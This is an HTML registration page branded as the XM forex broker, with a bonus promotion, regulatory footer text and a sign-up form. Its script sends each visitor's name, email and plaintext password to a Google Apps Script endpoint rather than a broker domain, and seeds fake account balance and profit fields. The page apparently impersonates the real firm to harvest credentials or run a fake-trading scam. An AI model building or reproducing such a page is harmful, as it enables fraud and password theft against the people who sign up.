<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>XM – Register</title>

  <style>
    :root {
      --bg: #f4f6f8;
      --card: #ffffff;
      --text: #0b1022;
      --muted: #6b7280;
      --border: #e5e7eb;
      --primary: #0b1c33;
      --blue: #1f7bff;
    }

    * {
      box-sizing: border-box;
      font-family: Segoe UI, Roboto, Arial, sans-serif;
      padding: 0px;
      margin: 0px;
    }

    .wrap {
      margin: 0;
      min-height: 100vh;
      background: var(--bg);
      display: flex;
      justify-content: flex-start;
      align-items: center;
      flex-direction: column;
    }

    .auth-card {
      width: 100%;
      max-width: 420px;
      background: var(--card);
      border-radius: 14px;
      padding: 22px;
      margin: 50px 0px;
    }

    /* header */
    .auth-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 14px;
      background-color: #fff;
      z-index: 100;
    }

    .logo {
      font-weight: 800;
      font-size: 22px;
      letter-spacing: -.5px;
    }

    .lang {
      font-size: 14px;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
    }

    /* promo */
    .promo {
      background: linear-gradient(135deg, #0b1c33, #081f2a);
      border-radius: 12px;
      padding: 16px;
      color: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 22px;
      position: relative;
      overflow: hidden;
      --bg-image: url("images/icon_100per.png");
      --bg-image-coin-1: url("images/coin-1.webp");
      --bg-image-coin-1: url("images/coin-2.webp");
    }

.promo {
  background: linear-gradient(135deg, #0b1c33, #081f2a);
  border-radius: 12px;
  height: 100px;
  padding: 16px;
  color: #fff;
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 22px;
  position: relative;
  overflow: hidden;
}

    /* -------- LAYER 1 (back-most) -------- */
    .promo::before {
      content: "";
      position: absolute;
      left: 50px;
      top: -20px;
      width: 68px;
      height: 68px;
      background: url("images/coin-1.webp") no-repeat center;
      background-size: contain;
      opacity: 1;
      z-index: 0;
    }

    /* -------- LAYER 2 (icon / object) -------- */
    .promo::after {
      content: "";
      position: absolute;
      left: -20px;
      bottom: -20px;
      width: 68px;
      height: 68px;
      background: url("images/coin-2.webp") no-repeat center;
      background-size: contain;
      opacity: 1;
      z-index: 1;
    }

    /* -------- LAYER 3 (highlight / glow / shape) -------- */
    .promo .bg-layer-3 {
      position: absolute;
      bottom: -15px;
      right: 10px;
      width: 130px;
      height: 130px;
      background: url("images/icon_100per.png") no-repeat center;
      background-size: contain;
      opacity: 1;
      z-index: 2;
      pointer-events: none;
    }

    /* -------- CONTENT ABOVE ALL -------- */
    .promo > *:not(.bg-layer-3) {
      position: relative;
      z-index: 3;
    }

    .promo strong {
      font-size: 15px
    }

    .promo span {
      font-size: 42px;
      font-weight: 800;
      opacity: .9;
    }

    h1 {
      font-size: 22px;
      margin: 0 0 6px;
      color: var(--text);
    }

    .sub {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 18px;
    }

    .sub a {
      color: var(--blue);
      text-decoration: none
    }

    /* form */
    label {
      font-size: 13px;
      color: #374151;
      display: block;
      margin: 14px 0 6px;
    }

    .field {
      width: 100%;
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 12px 14px;
      font-size: 15px;
      outline: none;
    }

    .field:focus {
      border-color: var(--blue)
    }

    .password-wrap {
      position: relative;
    }

    .toggle-pass {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 14px;
      color: #6b7280;
    }

    .partner {
      font-size: 14px;
      margin: 12px 0;
    }

    .partner a {
      color: var(--blue);
      text-decoration: none;
    }

    .consent {
      display: flex;
      gap: 10px;
      font-size: 12px;
      color: #6b7280;
      margin: 14px 0 18px;
      line-height: 1.4;
    }

    .consent input {
      margin-top: 3px
    }

    .btn {
      width: 100%;
      border: none;
      border-radius: 10px;
      padding: 14px;
      background: linear-gradient(180deg, #1f2937, #111827);
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }

    /* disabled register button */
    .btn:disabled{
      background: #cfd4da34;
      color: #8a8f98;
      cursor: not-allowed;
    }

    .helper{
      color:#e11d48;
      font-size:12px;
      display:block;
      margin-top:4px;
      min-height:14px;
    }

    .field.error{
      border-color:#e11d48;
    }

    .toggle-pass{
      width:20px;
      height:20px;
      cursor:pointer;
    }


    @media (max-width:700px) {
      body {
        padding: 0px
      }

      .auth-card {
        width: 100%;
        max-width: none;
        background: var(--card);
        border-radius: 14px;
        padding: 22px;
        box-shadow: none;
        margin: 0px;

    /* header */
    .auth-header {
      top: 0;
      position: sticky;
      background-color: #fff;
      z-index: 100;
    }
      }
    }
  </style>

  <style>
    * {
    -webkit-tap-highlight-color: transparent;
    }
  </style>

</head>

<body>
  <div class="wrap">
    <div class="auth-card" id="registerForm">
      <div class="auth-header">
        <div class="logo"><img src="images/xm-logo-dark.png" alt="" style="height: 55px;"></div>
        <div class="lang">English</div>
      </div>

      <div class="promo">
        <div class="bg-layer-3"></div>
        <strong>Get a 100% Bonus up to $100</strong>
      </div>

      <h1>Let’s get you registered!</h1>
      <div class="sub">Already have an account? <a href="login.html">Login</a></div>

      <label>Country of Residence</label>
      <select id="country" class="field">
        <option value="">Select country</option>
      </select>
      <small class="helper" id="countryHelper"></small>      


      <label>Full Name</label>
      <input id="fullname" class="field" type="text" placeholder="Full Name">
      <small class="helper" id="nameHelper"></small>

      <label>Email</label>
      <input id="email" class="field" type="email" placeholder="Email">
      <small class="helper" id="emailHelper"></small>

      <label>Password</label>
      <div class="password-wrap">
        <input id="password" class="field" type="password" placeholder="Password">
        <img id="passIcon" class="toggle-pass" src="images/visible_on.png" onclick="togglePass()">
      </div>
      <small class="helper" id="passHelper"></small>

      <label>Confirm Password</label>
      <div class="password-wrap">
        <input id="confirmPassword" class="field" type="password" placeholder="Confirm Password">
        <img id="confirmIcon" class="toggle-pass" src="images/visible_on.png" onclick="toggleConfirmPass()">
      </div>
      <small class="helper" id="confirmHelper"></small>

      <div class="partner">
        Have a Partner Code? <a href="#">Enter here</a>
      </div>

      <div class="consent">
        <input id="consent" type="checkbox">
        <span>
          I consent to receiving marketing communications and to the use of my data
          for marketing optimization and personalization purposes.
        </span>
      </div>

      <small class="helper" id="consentHelper"></small>    <br>  

      <button id="registerBtn" class="btn" disabled>Create Account</button>


      <p style="font-size: 12px;margin-top: 20px;">By registering, I declare that I have carefully read, understood and accepted the entire text of the Company's
        Legal Documents and Privacy Policy. I further understand that I will receive newsletters, company news, and
        product updates.</p>

    </div>

    <div class="footer-section">
      <div class="footer-legal">
        <div class="legal-links">
          <a href="">Privacy Policy</a>
          <a href="">Cookie Policy</a>
          <a href="">Vulnerability Policy</a>
          <a href="">Legal Documents</a>
        </div>
        <hr>
        <div style="display: flex;flex-direction: column;gap:20px;" class="lega-statement">
          <p>XM Global Limited is regulated by the Financial Services Commission (FSC) of Belize under the Securities
            Industry Act 2021 (license number 000261/27).</p>
          <p> XM (SC) Limited is regulated by the Seychelles Financial Services Authority (FSA) under Securities
            Dealer's License number SD190.</p>
          <p>Trading Point of Financial Instruments Limited is authorised and regulated by Cyprus Securities and
            Exchange Commission (CySEC) under licence number 120/10.</p>
          <p>All entities referenced herein are part of the Trading Point Group and are duly authorized to operate under
            the XM brand.</p>
          <p>XM International MU Limited is regulated by the Financial Services Commission (FSC) of Mauritius under the
            Investment Dealer's License number GB23202700.</p>
        </div>

      </div>
      <div class="footer-parterners">

      </div>
    </div>
  </div>



<script>
const API = "https://script.google.com/macros/s/AKfycbyo6uGNQ_IDRTkm5AEzPPRLkdzarH8BUzETivaZ8pFl1eq82j6FwYwj_vK8AfeGBKmX-Q/exec";

/* PASSWORD ICONS (INSERT YOUR IMAGE PATHS) */
const eyeOpen = "images/visible_on.png";
const eyeClosed = "images/visible_off.png";

/* PASSWORD TOGGLE */
const passIcon = document.getElementById("passIcon");
const confirmIcon = document.getElementById("confirmIcon");

function togglePass(){
  const p = document.getElementById("password");
  p.type = p.type === "password" ? "text" : "password";
  if(passIcon) passIcon.src = p.type === "password" ? eyeOpen : eyeClosed;
}

function toggleConfirmPass(){
  const p = document.getElementById("confirmPassword");
  p.type = p.type === "password" ? "text" : "password";
  if(confirmIcon) confirmIcon.src = p.type === "password" ? eyeOpen : eyeClosed;
}

/* COUNTRY DATASET */
const countries = [
"Afghanistan","Albania","Algeria","Andorra","Angola","Argentina","Armenia",
"Australia","Austria","Azerbaijan","Bahamas","Bahrain","Bangladesh","Belgium",
"Benin","Bolivia","Botswana","Brazil","Bulgaria","Burkina Faso","Cambodia",
"Cameroon","Canada","Chile","China","Colombia","Costa Rica","Croatia","Cyprus",
"Czech Republic","Denmark","Dominican Republic","Ecuador","Egypt","Estonia",
"Ethiopia","Finland","France","Georgia","Germany","Ghana","Greece","Guatemala",
"Honduras","Hong Kong","Hungary","Iceland","India","Indonesia","Ireland","Israel",
"Italy","Jamaica","Japan","Jordan","Kenya","Kuwait","Latvia","Lebanon","Lithuania",
"Luxembourg","Malaysia","Malta","Mexico","Morocco","Netherlands","New Zealand",
"Nigeria","Norway","Pakistan","Peru","Philippines","Poland","Portugal","Qatar",
"Romania","Saudi Arabia","Senegal","Singapore","Slovakia","Slovenia","South Africa",
"South Korea","Spain","Sri Lanka","Sweden","Switzerland","Thailand","Turkey",
"Ukraine","United Arab Emirates","United Kingdom","United States","Vietnam","Zambia",
"Zimbabwe"
];

/* DOM */
const country = document.getElementById("country");
const fullname = document.getElementById("fullname");
const email = document.getElementById("email");
const password = document.getElementById("password");
const confirmPassword = document.getElementById("confirmPassword");
const consent = document.getElementById("consent");
const btn = document.getElementById("registerBtn");

/* helpers */
const nameHelper = document.getElementById("nameHelper");
const emailHelper = document.getElementById("emailHelper");
const passHelper = document.getElementById("passHelper");
const confirmHelper = document.getElementById("confirmHelper");
const countryHelper = document.getElementById("countryHelper");
const consentHelper = document.getElementById("consentHelper");

/* populate countries */
countries.forEach(c=>{
  const opt=document.createElement("option");
  opt.value=c;
  opt.textContent=c;
  country.appendChild(opt);
});

/* helpers */
function validEmail(e){
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
}

function capitalizeName(name){
  return name
    .toLowerCase()
    .split(" ")
    .filter(Boolean)
    .map(w=>w.charAt(0).toUpperCase()+w.slice(1))
    .join(" ");
}

/* error UI */
function setError(field, helper, message){
  if(!field || !helper) return;

  if(message){
    field.style.borderColor = "#e11d48";
    helper.textContent = message;
  }else{
    field.style.borderColor = "";
    helper.textContent = "";
  }
}

/* validation (UPGRADED WITH HELPERS) */
function validate(){

  let ok = true;

  if(fullname.value.trim().length < 3){
    setError(fullname, nameHelper, "Enter your full name");
    ok=false;
  }else{
    setError(fullname, nameHelper, "");
  }

  if(!validEmail(email.value)){
    setError(email, emailHelper, "Enter a valid email");
    ok=false;
  }else{
    setError(email, emailHelper, "");
  }

  if(password.value.length < 6){
    setError(password, passHelper, "Minimum 6 characters");
    ok=false;
  }else{
    setError(password, passHelper, "");
  }

  if(confirmPassword.value !== password.value){
    setError(confirmPassword, confirmHelper, "Passwords do not match");
    ok=false;
  }else{
    setError(confirmPassword, confirmHelper, "");
  }

  if(!country.value){
    if(countryHelper) countryHelper.textContent="Select your country";
    ok=false;
  }else{
    if(countryHelper) countryHelper.textContent="";
  }

  if(!consent.checked){
    if(consentHelper) consentHelper.textContent="You must agree before continuing";
    ok=false;
  }else{
    if(consentHelper) consentHelper.textContent="";
  }

  btn.disabled = !ok;
}

[fullname,email,password,confirmPassword,country,consent]
.forEach(el=>el.addEventListener("input",validate));


/* =========================
   REGISTER
========================= */

let creating = false;

btn.onclick = async ()=>{

  if(btn.disabled || creating) return;

  creating = true;
  btn.textContent="Creating...";
  btn.disabled=true;

  try{

    const payload = {
      action: "register",
      name: capitalizeName(fullname.value.trim()),
      email: email.value.trim().toLowerCase(),
      password: password.value,
      balance: 0.00,
      equity: 0.00,
      profit: 0.00,
      volume: 0.00,      
      country: country.value,
    };

    const res = await fetch(API,{
      method:"POST",
      headers:{
        "Content-Type":"text/plain;charset=utf-8"
      },
      body: JSON.stringify(payload)
    });

    const text = await res.text();

    if(!text.startsWith("{")){
      throw new Error("Bad server response");
    }

    const data = JSON.parse(text);

    if(data.status){

      localStorage.setItem("uid",data.uid);

      window.location.href = "dashboard.html";

    }else{

      alert(data.message || "Registration failed");

      btn.disabled=false;
      btn.textContent="Create Account";
      creating=false;
    }

  }catch(err){

    console.error(err);

    alert("Connection error");

    btn.disabled=false;
    btn.textContent="Create Account";
    creating=false;
  }
};
</script>








</body>

</html>

<style>
  /* =========================
  FOOTER SECTION-4
========================= */
  .footer-section hr {
    background-color: rgba(128, 128, 128, 0.719);
    height: 1px;
    border-color: none;
  }

  .legal-links a {color: #000;}

  .footer-section {
    width: 100%;
    min-height: 500px;
    background: #fff;
    padding: 10px 30px;
  }

  .footer-header {
    padding: 0px 0px 50px 0px;
    font-size: 30px;
  }

  .footer-nav-wrapper {
    width: 100%;
    display: grid;
    grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
    padding: 50px 0px;
  }

  .footer-nav-col {
    min-height: 100px;
    min-width: 50px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .footer-nav-col p {
    cursor: pointer;
  }

  .footer-nav-col p:hover {
    color: blue;
  }

  .footer-nav-col h3 {
    color: gray;
  }

  .footer-appstore-btns {
    width: 100%;
    display: flex;
    justify-content: end;
    gap: 10px;
    padding: 30px 0px;
  }

  .footer-appstore-btns img {
    height: 40px;
  }

  .footer-notes {
    width: 100%;
  }

  .legal-links {
    gap: 20px;
    display: grid;
    grid-template-columns: 1fr 1fr 1fr 1fr;
    width: fit-content;
  }

  .footer-legal {
    display: flex;
    flex-direction: column;
    gap: 30px;
    font-size: 16px;
    padding: 30px 0px;
    color: gray;
  }





  .footer-parterners {
    width: 100%;
  }

  @media(max-width: 700px) {
    .legal-links {
      grid-template-columns: 1fr 1fr 2fr 2fr;
      gap: 5px;
      font-size: 12px;
    }

    .footer-nav-wrapper {
      display: none;
    }
  }
</style>



